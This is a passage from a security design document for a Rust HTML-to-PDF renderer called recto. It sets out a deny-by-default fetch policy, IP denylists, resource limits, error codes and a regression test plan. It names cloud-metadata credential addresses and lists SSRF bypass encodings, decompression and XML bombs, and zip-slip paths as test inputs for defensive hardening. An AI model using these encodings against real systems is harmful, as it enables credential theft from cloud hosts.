- Library mode (embedding) offers `recto::isolated::render()` that does the same via a spawned helper, for hosts that want it; default library `render()` is in-process with Layers 1–2 only.

---

## 7. Proposed default policy

### 7.1 Principles
1. Deny by default; every relaxation is an explicit flag/option, and the document can never relax policy (only the caller can).
2. One fetcher, one URL-resolution function, non-`Default` constructible; all `ResourceKind`s enumerated; CI test asserts each kind is policy-checked (table-driven test with a "spy" policy).
3. Validate before allocate; cap every input-derived quantity.
4. Deterministic failures: the same input + same limits → same error code (wall-clock excepted, and it is a backstop).
5. Fail closed: a resource that fails policy is treated as missing (rendering continues with a warning) in `lenient` mode (default for CLI compat), or aborts with an error in `strict` mode (default for server). *Rationale:* wkhtmltopdf users expect missing-image tolerance; servers should not leak oracles. Either way, the warning list is returned with the result.

### 7.2 Access defaults

| Setting | Default | Flag / option | Notes |
|---|---|---|---|
| Network | **off** | `--allow-network`, `--allow-host <host>` (repeatable; exact or `*.suffix`), `--allow-port` | `--allow-host` implies network on for those hosts only |
| Schemes | `data:` always; `file:` per roots; `http(s):` only if network on | — | everything else `E_SCHEME_DENIED` |
| File roots | **directory of the input file** (canonicalized), read-only. stdin input → **no file access** unless `--base-dir` | `--allow-dir <dir>` (repeatable), `--base-dir` | path-component prefix check after `canonicalize`; `openat2(RESOLVE_BENEATH)` where available |
| Symlinks | allowed only if target stays inside a root | `--follow-symlinks-outside` (off) | |
| Special files | regular files only; `/proc`, `/sys`, `/dev` always denied | — | |
| Hidden files | deny dotfiles/dotdirs (`.env`, `.git/`, `.ssh/`) inside roots | `--allow-hidden` | cheap protection for the common "input dir is the repo root" case |
| System fonts | **off** in server mode; on in CLI (read-only font dirs) | `--system-fonts=on/off` | system fonts also make output machine-dependent (determinism) |
| Attachments (`rel=attachment`, PDF/A-3 embeds) | off | `--allow-attachments` | still subject to fetch policy |
| iframes/object/embed | unsupported | — | |
| CIDR denylist | always on, even with network on (§7.3) | `--allow-private-network` (explicit, logs warning) | applies to every resolved IP and every redirect hop |
| Redirects | max 3, each hop re-validated, no https→http | `--max-redirects` | |
| DNS | resolve once, pin IP for connect | — | |
| Proxy env vars | ignored | `--proxy <url>` | |
| Cookies / auth headers | none sent | `--header` scoped per host | never forward caller's headers to document-chosen hosts |
| User-Agent | `recto` (no version) | `--user-agent` | |

### 7.3 Always-denied destination ranges (even when network is on)

IPv4: `0.0.0.0/8`, `10.0.0.0/8`, `100.64.0.0/10` (CGNAT; also Alibaba metadata `100.100.100.200`), `127.0.0.0/8`, `169.254.0.0/16` (link-local; AWS/GCP/Azure/OpenStack/DO metadata `169.254.169.254`, AWS `169.254.170.2` ECS task creds), `172.16.0.0/12`, `192.0.0.0/24` (incl. Oracle Cloud `192.0.0.192`), `192.0.2.0/24`, `192.88.99.0/24` (6to4 relay anycast), `192.168.0.0/16`, `198.18.0.0/15`, `198.51.100.0/24`, `203.0.113.0/24`, `224.0.0.0/4` (multicast), `240.0.0.0/4` (reserved), `255.255.255.255/32`.

IPv6: `::/128`, `::1/128`, `::ffff:0:0/96` (IPv4-mapped → check embedded v4), `::/96` (IPv4-compatible, deprecated → check embedded), `64:ff9b::/96` and `64:ff9b:1::/48` (NAT64 → check embedded v4), `100::/64` (discard), `2001::/32` (Teredo → check embedded/obfuscated v4, or deny outright), `2001:db8::/32`, `2002::/16` (6to4 → check embedded v4 at bits 16–47), `fc00::/7` (ULA; includes AWS IMDS IPv6 `fd00:ec2::254`), `fe80::/10` (link-local), `fec0::/10` (deprecated site-local), `ff00::/8` (multicast).

Implementation: `fn is_denied(ip: IpAddr) -> bool` with unit tests for every encoding in F12 and all Gotenberg bypass payloads (GHSA-4vmc-gm8v-m35h, GHSA-86m8-88fq-xfxp). If *any* resolved address is denied, deny the request (don't pick a "good" one — avoids round-robin rebinding).

### 7.4 Resource limits (defaults; all overridable downward by request, upward only by operator)

| Limit | CLI default | Server default | Error code |
|---|---|---|---|
| `max_input_bytes` (HTML after templating) | 64 MiB | 16 MiB | `E_LIMIT_INPUT_SIZE` |
| `max_template_data_bytes` (JSON) | 64 MiB | 16 MiB | `E_LIMIT_INPUT_SIZE` |
| `max_json_depth` | 128 | 128 | `E_LIMIT_JSON_DEPTH` |
| `max_dom_nodes` | 1,000,000 | 500,000 | `E_LIMIT_DOM_NODES` |
| `max_dom_depth` | 512 | 512 | `E_LIMIT_DOM_DEPTH` |
| `max_attributes_per_element` | 1,024 | 1,024 | `E_LIMIT_DOM_NODES` |
| `max_css_bytes` (all sheets) | 16 MiB | 8 MiB | `E_LIMIT_CSS` |
| `max_css_rules` | 100,000 | 50,000 | `E_LIMIT_CSS` |
| `max_css_nesting` (blocks/functions/selectors) | 64 | 64 | `E_LIMIT_CSS` |
| `max_import_depth` | 8 | 8 | `E_LIMIT_CSS` |
| `max_var_expansion_tokens` | 65,536 | 65,536 | value invalid at computed time (spec behaviour) + `W_VAR_TOO_LONG` |
| `max_generated_content_chars` (per box) | 65,536 | 65,536 | truncated + warning |
| `max_resources` (distinct fetches) | 1,000 | 256 | `E_LIMIT_RESOURCES` |
| `max_resource_bytes` (per fetched/decoded-container resource) | 50 MiB | 20 MiB | `E_LIMIT_RESOURCE_SIZE` |
| `max_total_fetch_bytes` | 500 MiB | 100 MiB | `E_LIMIT_FETCH_TOTAL` |
| `max_decompressed_bytes` (per SVGZ/WOFF/WOFF2/gzip/zlib stream) | 64 MiB | 32 MiB | `E_LIMIT_DECOMPRESS` |
| `max_decompression_ratio` | 1:200 (after first 1 MiB) | 1:100 | `E_LIMIT_DECOMPRESS` |
| `max_image_pixels` (per image, from header) | 100 Mpx | 50 Mpx | `E_LIMIT_IMAGE_PIXELS` |
| `max_total_image_pixels` (decoded per job) | 1 Gpx | 300 Mpx | `E_LIMIT_IMAGE_PIXELS` |
| `max_svg_nodes` / `max_svg_depth` / `max_svg_nesting` (svg-in-image) | 100,000 / 256 / 4 | 50,000 / 256 / 4 | `E_LIMIT_SVG` |
| SVG DTD | rejected | rejected | `E_SVG_DTD` (or treat image as broken) |
| `max_fonts` (web fonts loaded) | 128 | 64 | `E_LIMIT_FONTS` |
| `max_font_bytes` (decompressed sfnt) | 64 MiB | 32 MiB | `E_LIMIT_FONTS` |
| `max_pages` | 100,000 | 10,000 | `E_LIMIT_PAGES` |
| `max_layout_passes` (target-counter fixpoint) | 4 | 4 | `W_LAYOUT_NOT_CONVERGED` (not fatal) |
| `max_work` (fuel units) | 2³⁴ | 2³² | `E_LIMIT_WORK` |
| `max_output_bytes` (PDF) | 2 GiB | 256 MiB | `E_LIMIT_OUTPUT` |
| `memory_limit` (counting allocator, per job) | 2 GiB | 512 MiB | `E_LIMIT_MEMORY` |
| worker `RLIMIT_AS` | n/a | memory_limit × 2 + 256 MiB | `E_WORKER_CRASHED` |
| `timeout` (wall clock, per job) | 120 s | 30 s | `E_TIMEOUT` |
| fetch connect / per-resource / phase timeouts | 5 s / 10 s / 30 s | 3 s / 5 s / 10 s | `E_FETCH_TIMEOUT` (per resource → warning in lenient) |
| `max_redirects` | 3 | 3 | `E_FETCH_REDIRECT_LIMIT` |
| server `max_request_bytes` | — | 32 MiB | HTTP 413 |
| server header/body timeouts | — | 10 s / 30 s | HTTP 408 |
| server `workers` / `queue_depth` | — | ncpu / 2×ncpu | HTTP 503 |
| template `max_partial_depth` | 16 | 16 | `E_TEMPLATE_DEPTH` |
| asset bundle: entries / total uncompressed | 10,000 / 256 MiB | 2,000 / 64 MiB | `E_BUNDLE_LIMIT`, `E_BUNDLE_PATH` |

(Values are starting points; perf research should validate that a 1000-page invoice batch stays far below each. Rationale for 512 DOM depth and 100 Mpx: real documents need < 50 depth and < 30 Mpx images.)

### 7.5 Error model
Stable, documented codes (string IDs in API/JSON, numeric CLI exit codes grouped by class):

| Class | Exit code | Codes |
|---|---|---|
| Success with warnings | 0 (warnings on stderr / JSON `warnings[]`) | `W_RESOURCE_BLOCKED`, `W_RESOURCE_MISSING`, `W_LINK_SCHEME_DROPPED`, `W_UNSUPPORTED_EMBED`, `W_LAYOUT_NOT_CONVERGED`, `W_VAR_TOO_LONG`, `W_FONT_REJECTED`, `W_IMAGE_REJECTED` |
| Usage | 2 | `E_USAGE` |
| Input invalid | 3 | `E_INPUT_ENCODING`, `E_TEMPLATE_SYNTAX`, `E_JSON_SYNTAX`, `E_BUNDLE_PATH` |
| Policy violation (strict mode) | 4 | `E_SCHEME_DENIED`, `E_HOST_DENIED`, `E_IP_DENIED`, `E_PATH_DENIED`, `E_NETWORK_DISABLED`, `E_ATTACHMENT_DENIED` |
| Resource limit | 5 | all `E_LIMIT_*`, `E_SVG_DTD`, `E_TEMPLATE_DEPTH`, `E_BUNDLE_LIMIT` |
| Time | 6 | `E_TIMEOUT`, `E_FETCH_TIMEOUT` (strict) |
| Fetch failure (strict) | 7 | `E_FETCH_FAILED`, `E_FETCH_REDIRECT_LIMIT`, `E_FETCH_STATUS` |
| Internal | 70 | `E_INTERNAL_PANIC`, `E_WORKER_CRASHED`, `E_SANDBOX_VIOLATION` |

Determinism rules: limits are checked at fixed, input-order checkpoints, so the *first* breached limit is deterministic; policy errors are raised at URL-resolution time in document order; the warning list is sorted by document position. Error messages over HTTP never include absolute paths, resolved IPs, or fetched content.

### 7.6 wkhtmltopdf / Puppeteer compat-shim mapping (security-relevant flags)
- `--enable-local-file-access` → `--allow-dir <input dir>` (still rooted; never whole filesystem). `--allow <path>` → `--allow-dir <path>`. `--disable-local-file-access` → default.
- `--disable-javascript`/`--enable-javascript`, `--javascript-delay`, `--run-script`, `--window-status` → accepted and ignored with warning (no JS).
- `--load-error-handling ignore|skip|abort` → lenient vs strict mode.
- `--cookie`, `--custom-header`, `--custom-header-propagation` → scoped headers; `--custom-header-propagation` (send to all subresources) is **refused** unless combined with `--allow-host` (prevents leaking auth to document-chosen hosts).
- `--proxy` → `--proxy`.
- Puppeteer `page.pdf()` has no security options; network policy comes from recto config.

---

## 8. Test plan (security regression suite)
1. Fetch-policy matrix: for every `ResourceKind` × payload in F1–F21 (incl. all Gotenberg/Browsershot/dompdf bypass strings), assert no filesystem/network syscall happens (run under a test `Fetcher` spy and, on Linux CI, under seccomp `Errno` to catch accidental direct I/O).
2. IP denylist unit tests: decimal/octal/hex/short IPv4, all v6 embeddings, `[::ffff:127.0.0.1]`, `2002:a9fe:a9fe::1`, `64:ff9b::a9fe:a9fe`, `fd00:ec2::254`.
3. Local HTTP test server for redirects (302→127.0.0.1, redirect loops, https→http), slow responses, huge Content-Length, gzip bombs; DNS rebinding via a stub resolver injected in tests.
4. Bomb corpus: deep DOM (1e6), billion laughs SVG, 50000² PNG header, WOFF2 with 4 GB `totalSfntSize`, SVGZ 1 GB, 1e6 page breaks, `var()` exponential, target-counter oscillation fixture, 80k-attribute element, colspan=1e9.
5. Output: fuzz PDF writer with arbitrary metadata/link strings and parse with a PDF parser (e.g. lopdf ≥0.42 in dev-deps) asserting no `/JS`, `/JavaScript`, `/Launch`, `/AA`, `/OpenAction` objects exist.
6. Template: escaping golden tests (all 5 chars + attribute contexts), partial recursion, zip-slip entries (`../`, `..\`, absolute, symlink).
7. `cargo-fuzz` targets (HTML sink, CSS parser, URL resolver, font subsetter, image sniffers, PDF writer, template engine); OSS-Fuzz later.
8. CI: `cargo deny` (advisories, unmaintained, yanked, licenses), `cargo audit`.

---

## Findings that affect recto's design

1. **No JavaScript removes the largest historical bug class** (PhantomJS/html-pdf/wkhtmltopdf/Chrome XHR-based file exfiltration). The remaining surface is declarative fetching + resource exhaustion — exactly where WeasyPrint (5 advisories, latest 2026-10-07) and dompdf (20 advisories, 4 in July 2026) keep failing. Design against their failure patterns.
2. **Single, mandatory, non-`Default` fetcher.** WeasyPrint CVE-2024-28184 (attachments) and CVE-2026-55073 (xmp_metadata/stylesheets built a fresh default fetcher) show that a "second fetch path" is the dominant bug. Make the policy a required constructor argument of the render context; enumerate `ResourceKind`; table-driven test proves every kind is checked.
3. **Redirects, DNS rebinding, and IP encodings must be handled on resolved `IpAddr`s with IP pinning** — string/regex deny-lists failed repeatedly in Gotenberg (8 SSRF advisories in 2026 alone, incl. `[::ffff:127.0.0.1]`, 6to4/NAT64, uppercase schemes, rebinding). Pick an HTTP client that lets recto supply the resolved socket address (API **UNVERIFIED** for ureq 3.4.2 / reqwest 0.13.5) or implement a minimal HTTP/1.1 client over a pinned `TcpStream` + rustls.
4. **Path checks: canonicalize + `Path::starts_with` (component-wise) + regular-file check + deny `/proc` `/sys` `/dev`**; prefer `openat2(RESOLVE_BENEATH)`. dompdf CVE-2026-55554 (string-prefix chroot) is the anti-pattern.
5. **usvg must be wrapped, not used with defaults:** replace `ImageHrefResolver::default_string_resolver` (does unconfined `std::fs::read`, `crates/usvg/src/parser/image.rs:85-114`); do SVGZ decompression ourselves (usvg's `decompress_svgz` is unbounded, `parser/mod.rs:180-189`); pre-check node count/depth tighter than usvg's 1,000,000 / 1024; parse with roxmltree ourselves with `allow_dtd: false` and call `Tree::from_xmltree`.
6. **roxmltree/html5ever are safe against billion laughs and XXE** (fixed 2231-entry table in html5ever; roxmltree loop detector 10 depth/255 refs and no external entity resolution unless a resolver is passed). html5ever has **no depth limit** → recto's DOM sink must enforce `max_dom_depth`.
7. **Stack overflow and OOM abort the process on stable Rust** (`handle_alloc_error` docs; `set_alloc_error_hook` unstable; RUSTSEC-2026-0187 shows stack overflow is uncatchable). Therefore: explicit depth caps everywhere + known-size job thread stack + pre-allocation validation + counting allocator with cooperative checks; true hard limits only via worker subprocesses (`RLIMIT_AS`, `SIGKILL`).
8. **Server mode should be supervisor + sandboxed worker processes** with a supervisor-side fetch broker; workers get Landlock (landlock 0.4.7, ABI V1–V9, BestEffort) + seccomp (seccompiler 0.5.0, libc-only, musl-tested) and no network syscalls. No shared temp dirs (Gotenberg CVE-2026-42597), no webhooks/downloadFrom in v1.
9. **Font stack: use fontations (skrifa 0.48 / read-fonts 0.45) and harfrust 0.14**; ttf-parser (RUSTSEC-2026-0192) and rustybuzz (RUSTSEC-2026-0206) are now declared unmaintained. If resvg/usvg pulls ttf-parser transitively for SVG text, consider disabling usvg's `text` feature and rendering SVG text via recto's own text stack, or accept and track.
10. **Image decoding: allowlist formats via Cargo features** (PNG, JPEG, GIF, WebP; no EPS/HDR/TIFF/BMP/ICO by default — WeasyPrint CVE-2026-106443, image RUSTSEC-2019-0014), set `image::Limits` explicitly (default `max_alloc` 512 MiB, no dimension limits) and `png::Limits.bytes`, check header pixels before decode, pass JPEG through without decoding.
11. **PDF writer must be injection-proof by construction**: hex/escaped strings for all user text, XML-escaped XMP, link-scheme allowlist (http/https/mailto/tel/internal), and a CI check that no JS/Launch/AA actions can ever be emitted (jsPDF 2026 object-injection CVEs).
12. **Template engine: logic-less, escape-by-default, no eval, no filesystem includes, partial depth cap; asset bundles read into an in-memory VFS (never extracted)** — md-to-pdf, ReportLab, Gotenberg zip-slip, zip RUSTSEC-2025-0168.
13. **Determinism extends to failures**: a fuel-based `E_LIMIT_WORK` makes CPU exhaustion reproducible; wall-clock `E_TIMEOUT` is only a backstop. target-counter fixed-point iteration capped (4 passes) with deterministic fallback.
14. **Lenient vs strict mode**: CLI default lenient (blocked resources become warnings, wkhtmltopdf-compatible), server default strict (fail closed, no oracle differences).

## Recommendation

Adopt the policy in §7 as recto's v1 security contract and document it as such (it is a feature differentiator vs wkhtmltopdf CVE-2022-35583 "won't fix"). Implementation order: (1) `Policy` + `Fetcher` + `ResourceKind` + URL/IP/path validation with the test matrix in §8 — before any fetching code exists; (2) DOM-sink limits and job thread with fixed stack + `catch_unwind`; (3) decoder wrappers (image/font/SVG/decompression) with pre-allocation checks; (4) counting allocator + fuel; (5) PDF writer escaping + action denylist test; (6) server supervisor/worker split with Landlock + seccomp, supervisor-side fetch broker. Keep network support behind a Cargo feature (`net`) so the default static binary contains no HTTP client at all.

## Open questions / UNVERIFIED items

- HTTP client: whether ureq 3.4.2 or reqwest 0.13.5 exposes a resolver/connector hook allowing IP pinning + redirect control without re-resolution — **UNVERIFIED** (source not inspected). Fallback: minimal HTTP/1.1 client on pinned `TcpStream`.
- `rustix` 1.1.5 `openat2`/`RESOLVE_BENEATH` API names — **UNVERIFIED**.
- `libc` crate defining `SYS_landlock_*` for `x86_64-unknown-linux-musl` / `aarch64-unknown-linux-musl` — **UNVERIFIED** (very likely). End-to-end static-musl build of seccompiler+landlock not performed (no crate downloads in this environment).
- cssparser 0.38 / selectors 0.41 / lightningcss alpha.72: whether block nesting and selector nesting are recursive and whether they have internal limits — **UNVERIFIED**; enforce recto-side caps regardless.
- usvg 0.48.1 dependency on ttf-parser/rustybuzz (via fontdb / `text` feature) — **UNVERIFIED**; check `crates/usvg/Cargo.toml` in the font/SVG research.
- usvg SVG `<style>` handling: whether `@import`/`url()` inside SVG CSS triggers any resolver call — **UNVERIFIED**; add a test.
- skrifa composite-glyph / CFF recursion constants — **UNVERIFIED**; harfrust buffer/context limits — **UNVERIFIED**.
- Blink's parser depth cap (512), column-count cap (1000), HTML colspan/rowspan clamps (1000/65534), PDF page size implementation limit (14,400 pt), serde_json default recursion limit (128), clippy lint names — from memory, **UNVERIFIED**.
- openhtmltopdf/Flying Saucer XXE defaults — no CVE found; **UNVERIFIED**.
- Whether the counting-allocator approach (Layer 2) has acceptable overhead (one TLS access + add per alloc/free) — needs a benchmark in the perf research.
- Default limit values in §7.4 are proposals; validate against the benchmark corpus (1000-page invoices, large reports) so that legitimate documents never hit them.
